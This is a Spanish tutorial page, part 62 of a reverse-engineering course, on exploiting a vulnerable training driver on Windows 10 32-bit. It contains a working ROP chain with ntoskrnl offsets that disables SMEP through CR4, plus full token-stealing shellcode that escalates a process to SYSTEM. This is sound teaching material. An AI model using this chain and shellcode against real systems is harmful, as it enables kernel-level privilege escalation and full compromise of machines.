@@ -1,0 +1,253 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tute 62 · Variante en Windows 10 x86 — Curso IDA</title>
+<meta name="description" content="Tutorial ilustrado del tute 62 del Curso IDA desde cero: Variante en Windows 10 x86.">
+<link rel="stylesheet" href="../guia/estilo.css">
+</head>
+<body>
+<a class="salto" href="#contenido">Saltar al contenido</a>
+<header class="cabecera">
+  <div class="marca"><a href="../00_EMPEZAR_AQUI.html">CLS · Curso de reversing</a> <span class="edicion">edición 5 · 27/10/2026</span></div>
+  <nav class="principal" aria-label="Navegación principal">
+    <a href="../00_EMPEZAR_AQUI.html">Inicio</a>
+    <a href="../guia/index.html">Curso</a>
+    <a href="../fichas/index.html">Fichas</a>
+    <a href="../glosario.html">Glosario</a>
+    <a href="../preguntas_y_respuestas.html">Repaso</a>
+  </nav>
+</header>
+<main id="contenido">
+<p class="migas"><a href="../ida-tutes.html">← Índice de los 69 tutes de IDA</a></p>
+<h1>Tute 62 · Variante en Windows 10 x86</h1>
+<p class="meta-tute"><strong>⏱ 15 min de lectura</strong> · 2.700 palabras · 58 capturas · grupo: Kernel de Windows y temas avanzados (drivers, HackSys/HEVD, SSDT/syscalls, VA→física)</p>
+<aside class="callout nota"><p class="callout-titulo">Qué enseña</p><p>La misma explotación del driver, ahora en Win10 de 32 bits.</p></aside>
+<p><em>se conecta con:</em> <a href="../guia/05-fuera-de-alcance.html">Fuera de alcance</a></p>
+<aside class="callout aviso"><p class="callout-titulo">Material observado, no reescrito</p><p>Es el texto y las capturas del <code>.docx</code> original del curso, solo presentados como tutorial. Puede tener erratas de origen. El autor del curso es Ricardo Narvaja.</p></aside>
+<hr>
+<p>INTRODUCCIÓN AL REVERSING CON IDA PRO DESDE CERO PARTE 62.</p>
+<p>WINDOWS 10</p>
+<p>Retornamos después de las vacaciones con nuevos tutoriales, en este caso veremos la variante de explotación del mismo driver que vimos en Windows 7 de 32 bits, ahora en Windows 10 de 32 bits.</p>
+<p>SMEP</p>
+<p>La diferencia como dijimos esta en SMEP y que es eso, es la protección para evitar saltar de kernel a ejecutar páginas marcadas como user, como hacemos en los ejemplos que vimos hasta ahora que allocamos una página en user con permiso de ejecución, y cuando tomamos control de la misma saltamos allí donde está el shellcode directamente.</p>
+<p>El que quiere profundizar sobre el tema smep, acá hay una muy buena explicación, está en ingles pero se entiende.</p>
+<p>https://www.coresecurity.com/system/files/publications/2016/05/Windows%20SMEP%20bypass%20U%3DS.pdf</p>
+<figure><img loading="lazy" src="img/62/1.png" alt="Captura 1 del tute 62"></figure>
+<p>El bit 20 del registro de DEBUG cr4 es el que si esta prendido (1) habilita la protección SMEP, por lo tanto para que no funcione habrá que poner a cero (0) ese bit con algún rop, antes de saltar a ejecutar el bloque allocado en USER.</p>
+<figure><img loading="lazy" src="img/62/2.png" alt="Captura 2 del tute 62"></figure>
+<p>Allí vemos buf que era el buffer ejecutable creado en USER con permiso de ejecución donde luego saltamos directo a ejecutar cuando producimos el overflow y pisamos el return address.</p>
+<figure><img loading="lazy" src="img/62/3.png" alt="Captura 3 del tute 62"></figure>
+<p>Allí con la dirección del buffer de user pisábamos el return address y el</p>
+<p>struct.pack("&lt;L",0x0BAD0B0B0 )</p>
+<p>Evitaba que siguiéramos copiando más abajo, ya que salía del loop y terminaba de copiar.</p>
+<figure><img loading="lazy" src="img/62/4.png" alt="Captura 4 del tute 62"></figure>
+<p>Antes que nada debemos decir que para que funcione Windows 10 como host de debugging de kernel, luego de instalar VKD como vimos en los capítulos anteriores y antes de reiniciar se debe tipear por única vez en una consola con permiso de administrador.</p>
+<p>BCDEDIT /dbgsettings serial</p>
+<p>Y ahí si, reiniciamos, otra cosa que verán es que al reiniciar les saldrá algo como esto.</p>
+<figure><img loading="lazy" src="img/62/5.png" alt="Captura 5 del tute 62"></figure>
+<p>Donde deberán apretar f8.</p>
+<p>DESHABILITAR FIRMAS.</p>
+<figure><img loading="lazy" src="img/62/6.png" alt="Captura 6 del tute 62"></figure>
+<p>Y allí deshabilitar la firma de drivers a la fuerza, que impide cargar el driver de VKD además que nos permitirá cargar el driver para explotar que obviamente no está firmado.</p>
+<p>En el caso de explotar un driver de algún programa o hardware estará firmado y cargara sin problemas.</p>
+<p>Después de todo eso, arrancara el windbg y breakeara, seguimos apretando G, continuara la ejecución hasta que arranque el sistema.</p>
+<figure><img loading="lazy" src="img/62/7.png" alt="Captura 7 del tute 62"></figure>
+<p>Cargo el driver con OSRLOADER</p>
+<figure><img loading="lazy" src="img/62/8.png" alt="Captura 8 del tute 62"></figure>
+<p>Luego REGISTER SERVICE</p>
+<figure><img loading="lazy" src="img/62/9.png" alt="Captura 9 del tute 62"></figure>
+<p>Y luego START SERVICE.</p>
+<p>Ya sabemos que si queremos probar los exploits en Python deberemos instalarlo en el target y ponerlo en las environment variables, sino habrá que compilarlo en C o C++ con el runtime embebido, lo cual corre sin problemas.</p>
+<p>Ahora debemos</p>
+<p>Agregar un ROP que deshabilite SMEP (se debería detectar la versión exacta de Windows y según cual sea, que el script use el rop específico para cada una, ya que será diferente en cada caso, este script que estoy haciendo como es solo para una versión exacta de Windows 10, no le funcionara al que lo pruebe en otro Windows)</p>
+<p>Modificar el shellcode para robar el Token que usábamos en Windows 7, que aquí no funcionara porque las estructuras cambian un poco.</p>
+<p>Recuerden que el ROP es relativo a la versión, en mi caso de ntoskrnl.exe en mi caso es 10.0.15063.483</p>
+<figure><img loading="lazy" src="img/62/10.png" alt="Captura 10 del tute 62"></figure>
+<p>Que corresponde a esta versión de Windows en otra versión no funcionara.</p>
+<figure><img loading="lazy" src="img/62/11.png" alt="Captura 11 del tute 62"></figure>
+<p>Por supuesto desde una consola de usuario normal se puede saber la versión de Windows por lo cual en un exploit profesional se detectara la misma y según cual sea se enviara el rop correcto para cada una.</p>
+<p>Pero en mi caso lo hare solo para esa versión, no tengo ganas de trabajar tanto, jeje, ustedes para practicar pueden hacerlo.</p>
+<figure><img loading="lazy" src="img/62/12.png" alt="Captura 12 del tute 62"></figure>
+<p>Pondré un breakpoint al salir del loop, pero antes de quitar el windbg mirare el valor de los registers, luego de hacer debug-break.</p>
+<figure><img loading="lazy" src="img/62/13.png" alt="Captura 13 del tute 62"></figure>
+<p>Allí tenemos para ver los registros completos, también hay un comando que es r y algo mas para ver los debug registers, pero ahora me olvide los miro ahí jeje.</p>
+<figure><img loading="lazy" src="img/62/14.png" alt="Captura 14 del tute 62"></figure>
+<p>Vemos que el valor de cr4 es 6e9, y obvio el bit 20 esta deshabilitado, pero como puede ser si estoy en Windows 10, je.</p>
+<p>Si paso a binario 0x6e9.</p>
+<p>bin(0x6e9)</p>
+<pre class='asm'>0b11011101001</pre>
+<p>Si el más bajo es el bit 0, es obvio que rellenando con ceros a la izquierda hasta completar los 32 bits.</p>
+<p>0b000000000000000000000011011101001</p>
+<p>El que está en negrita es el bit 20 y está a cero por lo cual en esta máquina puedo ejecutar sin tener problemas con SMEP.</p>
+<figure><img loading="lazy" src="img/62/15.png" alt="Captura 15 del tute 62"></figure>
+<p>Sospecho o de la versión vieja de VMWARE que no debe soportar SMEP, o por ahí la maquina HOST es muy vieja, por si acaso instale VMWARE 14 en una maquina más nueva y cuando repito el procedimiento con el mismo target de Windows 10</p>
+<figure><img loading="lazy" src="img/62/16.png" alt="Captura 16 del tute 62"></figure>
+<p>Bueno acá es otra cosa, si vemos ese valor en binario.</p>
+<p>bin(0x1406e9)</p>
+<p>'0b101000000011011101001'</p>
+<p>Vemos que el bit 20 está a 1, así que aquí SMEP si está habilitado.</p>
+<p>Hay alguna forma sin debuggear kernel o sea desde un programa en user saber si SMEP está habilitado?</p>
+<p>shellcode ="\x33\xC9"shellcode += "\x33\xC0"shellcode += "\x33\xdb"shellcode += "\xb8\x07\x00\x00\x00"     # "mov eax,7"shellcode += "\x0f\xa2"                 # "cpuid"shellcode += "\x8b\xc3"                 # "mov eax,ebx"shellcode += "\xc3"                     # "ret"</p>
+<p>Ejecutando ese código en un programa en user mode me devuelve en EAX diferente valor si hay SMEP habilitado o no</p>
+<p>Ahí puse a mano los registros a cero en vez de los XOR y escribí las dos instrucciones necesarias a ver que devuelve en EBX en la máquina que no tiene SMEP habilitado.</p>
+<figure><img loading="lazy" src="img/62/17.png" alt="Captura 17 del tute 62"></figure>
+<pre class='asm'>EBX devuelve 2</pre>
+<p>Preparo para hacer la prueba en otra máquina.</p>
+<figure><img loading="lazy" src="img/62/18.png" alt="Captura 18 del tute 62"></figure>
+<p>Vemos que EBX devuelve un valor muy diferente 0x001C2FBB</p>
+<figure><img loading="lazy" src="img/62/19.png" alt="Captura 19 del tute 62"></figure>
+<p>Haciendo AND de este resultado con 0x80</p>
+<p>hex(0x80 &amp; 0x001C2FBB)</p>
+<p>'0x80'</p>
+<p>hex(0x80 &amp; 0x002)</p>
+<p>'0x0'</p>
+<p>Vemos que si el resultado da cero no hay SMEP y si da diferente de cero hay SMEP.</p>
+<p>Se puede hacer esta pruebita desde Python? Veamos.</p>
+<p>CPUID</p>
+<p>Usando este módulo cpuid.</p>
+<p>https://github.com/flababah/cpuid.py</p>
+<p>Y poniéndolo en la misma carpeta del script</p>
+<figure><img loading="lazy" src="img/62/20.png" alt="Captura 20 del tute 62"></figure>
+<p>Me dará el valor de los registros el segundo es EBX que vale 2 en la maquina sin SMEP.</p>
+<figure><img loading="lazy" src="img/62/21.png" alt="Captura 21 del tute 62"></figure>
+<p>Me devuelve el valor en decimal que había obtenido antes.</p>
+<figure><img loading="lazy" src="img/62/22.png" alt="Captura 22 del tute 62"></figure>
+<p>Así que lo puedo agregar al inicio de mi script, para que detecte si tiene o no SMEP, ya que si no tiene no solo no es necesario ropear y se puede saltar directo al shellcode, sino que el rop que haremos que toca el flag de cr4, es mejor no tocarlo si no es necesario, aunque está a cero y quedara a cero, pero como el rop es personalizado conviene que si detecta que no hay smep salte directo al shellcode sin rop, lo cual lo hará mas general para los casos sin SMEP.</p>
+<p>Bueno ya tenemos casi todo, nos falta el rop, shellcode y leakear la base de nt para poder ropear allí.</p>
+<p>Ustedes dirán como obtengo los gadgets en kernel, con mona no se puede y el idasploiter no devuelve resultados aún en kernel, por lo cual no nos sirve.</p>
+<p>https://drive.google.com/open?id=1VbN3kipWQe9ti7WGheGSmbG9xOn4uaQW</p>
+<p>RP++</p>
+<p>Allí hay una tool para buscar gadgets en forma estática, sea un módulo de kernel o lo que sea, le pasas el nombre y cuanto es el máximo largo de los gadgets y te busca todo conviene guardarlo en un archivo de texto para poder luego buscar con comodidad.</p>
+<figure><img loading="lazy" src="img/62/23.png" alt="Captura 23 del tute 62"></figure>
+<p>rp-win-x86.exe -f ntoskrnl.exe -r 5 &gt; pepe.txt</p>
+<p>Bueno con eso nos guardara todos los gadgets en un archivo de texto llamado pepe.txt</p>
+<figure><img loading="lazy" src="img/62/24.png" alt="Captura 24 del tute 62"></figure>
+<p>Es un archivo grandísimo, pero es una gran tool que sirve y encuentra gadgets en cualquier modulo.</p>
+<p>Para leakear la base de nt usamos EnumDeviceDrivers, que devuelve una lista con los nombres y las bases de todos los drivers, generalmente nt es el primero sino podemos comparar el nombre en un loop hasta encontrar el que queremos y hallar la base de ese, veo que si lo ejecuto luego de importar los módulos faltantes, funciona e imprime la base de nt.</p>
+<figure><img loading="lazy" src="img/62/25.png" alt="Captura 25 del tute 62"></figure>
+<p>En resumidas cuentas yo halle estos gadgets que me servirían para leer cr4 poner ecx a 0xFFEFFFFF para luego hacer and ecx con eax y poner a cero el bit 20 y luego guardarlo de nuevo en cr4, ese sería un buen rop.</p>
+<p>input = struct.pack("&lt;I", nt + 0x11fc10)  # mov eax, cr4 - retinput += struct.pack("&lt;I", 0x75757575)  # junkinput += struct.pack("&lt;I", 0x76767676)  # junkinput += struct.pack("&lt;I", nt + 0x51976f)  # pop ecx; retinput += struct.pack("&lt;I", 0xFFEFFFFF)  # to disable smepinput += struct.pack("&lt;I", nt + 0x50095c)  # and eax,ecx; retinput += struct.pack("&lt;I", nt + 0x22f2da)  # mov cr4,eax; ret4</p>
+<p>El problema es que no lo puedo poner debajo del return address así nomás, porque allí debajo de r está el puntero al source que va leyendo y si lo piso puede crashear hay que hacerlo bien.</p>
+<figure><img loading="lazy" src="img/62/26.png" alt="Captura 26 del tute 62"></figure>
+<p>Veo que pasándome un solo dword del return address piso el puntero a UserBuffer que es el source, así que no esta tan fácil poner el rop allí debajo.</p>
+<p>data=shellcode+ ((0x828 -len(shellcode)) * "A")  #shellcode</p>
+<p>data+= struct.pack("&lt;I", nt + 0x51976f)     #return (pop ecx-ret) data+=struct.pack("&lt;L",int(buf)+0x82c)      # puntero a source que piso</p>
+<p>data+= input                                     # rop</p>
+<p>data+= struct.pack("&lt;L",0x0BAD0B0B0 )       # fin</p>
+<p>Una posibilidad sería pisar ese puntero, con un puntero al mismo shellcode más adelante, en este caso hago que el source cuando lo pisa empiece a apuntar al inicio de mi shellcode más 0x82c que es donde está el rop, así sigue copiando el mismo allí debajo y no se rompe, también piso el return address con un pop ecx-ret para que cuando salte a ejecutar saltee ese puntero al source y vaya justo al rop que quedara debajo.</p>
+<p>Puedo reacomodar el rop para que me queden varios rets al inicio para compensar que viene de un ret8 a ejecutar, y quitar los paddings intermedios.</p>
+<p>input = struct.pack("&lt;I", nt + 0x519770) *4 # retinput += struct.pack("&lt;I", nt + 0x11fc10)  # mov eax, cr4 - retinput += struct.pack("&lt;I", nt + 0x51976f)  # pop ecx; retinput += struct.pack("&lt;I", 0xFFEFFFFF)  # to disable smepinput += struct.pack("&lt;I", nt + 0x50095c)  # and eax,ecx; retinput += struct.pack("&lt;I", nt + 0x22f2da)  # mov cr4,eax; ret4input += struct.pack("&lt;I", int(buf))   # a shellcode</p>
+<p>Cuando lo ejecuto llego al ret</p>
+<figure><img loading="lazy" src="img/62/27.png" alt="Captura 27 del tute 62"></figure>
+<p>Y voy traceando</p>
+<figure><img loading="lazy" src="img/62/28.png" alt="Captura 28 del tute 62"></figure>
+<p>Si no se ve el código apreto f7 y si no se ve creo un segmento allí haciendo click derecho</p>
+<figure><img loading="lazy" src="img/62/29.png" alt="Captura 29 del tute 62"></figure>
+<figure><img loading="lazy" src="img/62/30.png" alt="Captura 30 del tute 62"></figure>
+<p>Una dirección baja de inicio del segmento, que abarque la zona donde estoy y un nombre cualquiera es suficiente vuelvo a apretar f7 y aparece el código.</p>
+<figure><img loading="lazy" src="img/62/31.png" alt="Captura 31 del tute 62"></figure>
+<p>Luego el rop salta acá</p>
+<figure><img loading="lazy" src="img/62/32.png" alt="Captura 32 del tute 62"></figure>
+<p>Donde queda cr4 en eax, luego hay un pop ecx ret donde pongo 0xffefffff</p>
+<figure><img loading="lazy" src="img/62/33.png" alt="Captura 33 del tute 62"></figure>
+<p>Luego el and para poner a 0 el bit 20</p>
+<figure><img loading="lazy" src="img/62/34.png" alt="Captura 34 del tute 62"></figure>
+<p>Y luego volver a guardar el valor modificado en cr4</p>
+<figure><img loading="lazy" src="img/62/35.png" alt="Captura 35 del tute 62"></figure>
+<p>Recordemos que era 0x1406e9 y ahora 0x406e9 que tiene el bit 20 apagado</p>
+<figure><img loading="lazy" src="img/62/36.png" alt="Captura 36 del tute 62"></figure>
+<p>bin(0x406e9)</p>
+<p>'0b001000000011011101001'</p>
+<p>Luego queda saltar al shellcode es muy similar al de Windows 7 pero las estructuras cambian, veamos.</p>
+<figure><img loading="lazy" src="img/62/37.png" alt="Captura 37 del tute 62"></figure>
+<p>Lo primero que vamos ejecutando son los nops lo cual significa que SMEP quedo bien apagado, sino aquí crashearia la máquina y se reiniciaría.</p>
+<figure><img loading="lazy" src="img/62/38.png" alt="Captura 38 del tute 62"></figure>
+<p>Recordemos que fs:124 es un puntero a la estructura ETHREAD, la explicación ya la hicimos en el de Windows 7, acá cambiara solo algún offset.</p>
+<figure><img loading="lazy" src="img/62/39.png" alt="Captura 39 del tute 62"></figure>
+<p>En el windbg incluido en IDA podemos ver la estructura para Windows 10.</p>
+<figure><img loading="lazy" src="img/62/40.png" alt="Captura 40 del tute 62"></figure>
+<p>Como en el primer campo esta KTHREAD y esta ocupa 0x350, los campos que estamos trabajando están dentro de ella.</p>
+<p>Vemos que acá a diferencia de Windows 7, que ApcState que es del tipo _KAPC_STATE, estaba en el offset 0x50, acá está en el offset 0x70.</p>
+<figure><img loading="lazy" src="img/62/41.png" alt="Captura 41 del tute 62"></figure>
+<p>En el offset 0x10 de esa estructura esta</p>
+<figure><img loading="lazy" src="img/62/42.png" alt="Captura 42 del tute 62"></figure>
+<figure><img loading="lazy" src="img/62/43.png" alt="Captura 43 del tute 62"></figure>
+<p>Pasa a EAX vemos que es el famoso numerito EPROCESS del proceso actual en ECX.</p>
+<figure><img loading="lazy" src="img/62/44.png" alt="Captura 44 del tute 62"></figure>
+<p>Vemos que Pcb que es del tipo _KPROCESS está en el offset 0, así que coinciden en dirección con _EPROCESS, el tema es que acá busca el offset 0xfc y obvio no está dentro de KPROCESS porque su largo es 0xb0, así que está en EPROCESS más abajo.</p>
+<figure><img loading="lazy" src="img/62/45.png" alt="Captura 45 del tute 62"></figure>
+<p>Así que lee el Token del proceso actual del offset 0xfc y lo deja en EBX.</p>
+<figure><img loading="lazy" src="img/62/46.png" alt="Captura 46 del tute 62"></figure>
+<p>Y de 0xb8 lee ActiveProcessLinks</p>
+<figure><img loading="lazy" src="img/62/47.png" alt="Captura 47 del tute 62"></figure>
+<p>Luego ya lo habíamos explicado en la versión de Windows 7</p>
+<figure><img loading="lazy" src="img/62/48.png" alt="Captura 48 del tute 62"></figure>
+<p>Es el FLINK o sea que apunta al ActiveProcessLink del proceso siguiente, como eso está en 0xb8 le resta esa constante para hallar el EPROCESS del proceso siguiente.</p>
+<figure><img loading="lazy" src="img/62/49.png" alt="Captura 49 del tute 62"></figure>
+<p>Luego va comparando el contenido del offset 0xb4 que es el PID, hasta que encuentra el proceso de PID 4 o sea SYSTEM</p>
+<figure><img loading="lazy" src="img/62/50.png" alt="Captura 50 del tute 62"></figure>
+<p>Una vez que sale del LOOP porque encontró SYSTEM y en EAX queda el EPROCESS del mismo, lee el Token del offset 0xfc y lo copia al proceso actual cuyo EPROCESS había quedado en ECX</p>
+<p>Luego queda volver correctamente al proceso sin que crashee lo cual no es fácil, lo del Token ya está listo.</p>
+<p>Una de las técnicas es tracear el programa cuando pasa por la misma función pero sin overflow y seguir cuando vuelve de cada función e ir mirando el stack, tratando de ver que cuando hay overflow vuelva en forma similar.</p>
+<figure><img loading="lazy" src="img/62/51.png" alt="Captura 51 del tute 62"></figure>
+<p>Como aquí yo vuelvo sin overflow y llego ahí hay un retn8 y el stack está en esa posición por lo cual volverá a</p>
+<figure><img loading="lazy" src="img/62/52.png" alt="Captura 52 del tute 62"></figure>
+<p>Así que trato de volver al mismo lugar y que el stack este en la misma posición cuando hay overflow y tengo que considerar el retn8.</p>
+<p>Ven que cuando entro a ejecutar mi shellcode el stack está bastante parecido</p>
+<figure><img loading="lazy" src="img/62/53.png" alt="Captura 53 del tute 62"></figure>
+<p>Al llegar al popad</p>
+<figure><img loading="lazy" src="img/62/54.png" alt="Captura 54 del tute 62"></figure>
+<p>El stack estaría bien, así que debo quitar el add esp, 0c que servía para otro exploit, quitar ese push y cambiar el ret por un retn 8 y debería funcionar.</p>
+<p>Podrida ser asi</p>
+<p>shellcode = struct.pack("&lt;I", 0x90909090)  # --[ setup]shellcode += "\x60"  # pushadshellcode += "\x64\xa1\x24\x01\x00\x00"  # mov eax, fs:[KTHREAD_OFFSET]# I have to do it like this because windows is a little special# this just gets the EPROCESS. Windows 7 is 0x50, now its 0x80.shellcode += "\x8d\x40\x70"  # lea eax, [eax+0x70];shellcode += "\x8b\x40\x10"  # mov eax, [eax+0x10];shellcode += "\x89\xc1"  # mov ecx, eax (Current _EPROCESS structure)# win 10 rs2 x86 TOKEN_OFFSET = 0xfc# win 07 sp1 x86 TOKEN_OFFSET = 0xf8shellcode += "\x8B\x98\xfc\x00\x00\x00"  # mov ebx, [eax + TOKEN_OFFSET]# --[ copy system PID token]shellcode += "\xba\x04\x00\x00\x00"  # mov edx, 4 (SYSTEM PID)shellcode += "\x8b\x80\xb8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] &lt;-|shellcode += "\x2d\xb8\x00\x00\x00"  # sub eax, FLINK_OFFSET           |shellcode += "\x39\x90\xb4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |shellcode += "\x75\xed"  # jnz                           -&gt;|# win 10 rs2 x86 TOKEN_OFFSET = 0xfc# win 07 sp1 x86 TOKEN_OFFSET = 0xf8shellcode += "\x8b\x90\xfc\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]shellcode += "\x89\x91\xfc\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx# --[ recover]shellcode += "\x61"  # popadshellcode += "\x31\xc0"  # return NTSTATUS = STATUS_SUCCESSshellcode += "\xc2\x08"  # ret</p>
+<p>Probemos este.</p>
+<figure><img loading="lazy" src="img/62/55.png" alt="Captura 55 del tute 62"></figure>
+<p>Ahí llegue al mismo punto funcionara? No, aun crashea falta algo más.</p>
+<p>Es muy probable que el pop ebp cuando no overflodea</p>
+<figure><img loading="lazy" src="img/62/56.png" alt="Captura 56 del tute 62"></figure>
+<p>Que saca del stack ese valor antes del retn8 sea el culpable.</p>
+<figure><img loading="lazy" src="img/62/57.png" alt="Captura 57 del tute 62"></figure>
+<p>Ya que después setea esp con ese valor.</p>
+<p>Cambiare allí para que sea retn solo y no retn asi vuelve y luego puedo acomodar ebp en mi shellcode.</p>
+<p>input = struct.pack("&lt;I", nt + 0x519770) *2 # ret</p>
+<p>input += struct.pack("&lt;I", nt + 0x11fc10)  # mov eax, cr4 - ret</p>
+<p>input += struct.pack("&lt;I", nt + 0x51976f)  # pop ecx; ret</p>
+<p>input += struct.pack("&lt;I", 0xFFEFFFFF)  # to disable smep</p>
+<p>input += struct.pack("&lt;I", nt + 0x50095c)  # and eax,ecx; ret</p>
+<p>input += struct.pack("&lt;I", nt + 0x11fc1e)  # mov cr4,eax; ret</p>
+<p>input += struct.pack("&lt;I", int(buf))   # a shellcode</p>
+<p>Y al inicio de mi shellcode pongo un pop ebp para que lo levante del stack antes del pushad.</p>
+<p>Ahora si ya funciona perfecto hice correr un notepad porque Microsoft en Windows 10 a veces restringe el uso de llamar a calc para joder jeje.</p>
+<figure><img loading="lazy" src="img/62/58.png" alt="Captura 58 del tute 62"></figure>
+<p>Ahí se ve el usuario SYSTEM o sea que pudimos deshabilitar SMEP y elevar privilegios en Windows 10 de 32 bits.</p>
+<p>En 64 bits es igual el metodo, por supuesto hay que adaptar los offsets de las estructuras, y también hay que guardar el valor de cr4, para llamar una vez más para hacer un segundo rop que lo restaure porque si no en 64 bits el PATCH GUARD cada tanto scanea y se da cuenta del cambio y te crashea la máquina, pero en si es el mismo metodo mas trabajoso, pero es la misma idea.</p>
+<p>Hasta la próxima parte</p>
+<p>Ricardo Narvaja</p>
+</main>
+<footer class="pie">
+  <p>Material educativo y defensivo. Las prácticas se limitan a programas propios, software abierto o crackmes diseñados para aprender. No se enseña a eludir licencias, DRM ni controles de acceso.</p>
+  <p><a href="../00_EMPEZAR_AQUI.html">Inicio</a> · <a href="../guia/etapa-0.html">Etapas</a> · <a href="../fuentes_y_limites.html">Fuentes y límites</a> · <a href="../registro_de_cobertura.csv">Registro de cobertura</a></p>
+</footer>
+<script>
+(function(){
+  function abrir(src){
+    var o=document.createElement('div'); o.className='lightbox-ov';
+    var i=document.createElement('img'); i.src=src; o.appendChild(i);
+    function cerrar(){o.remove(); document.removeEventListener('keydown', onkey);}
+    function onkey(e){ if(e.key==='Escape') cerrar(); }
+    o.addEventListener('click', cerrar);
+    document.addEventListener('keydown', onkey);
+    document.body.appendChild(o);
+  }
+  document.addEventListener('DOMContentLoaded', function(){
+    document.querySelectorAll('figure img, main img').forEach(function(img){
+      img.style.cursor='zoom-in';
+      img.addEventListener('click', function(){ abrir(img.currentSrc||img.src); });
+    });
+  });
+})();
+</script>
+</body>
+</html>
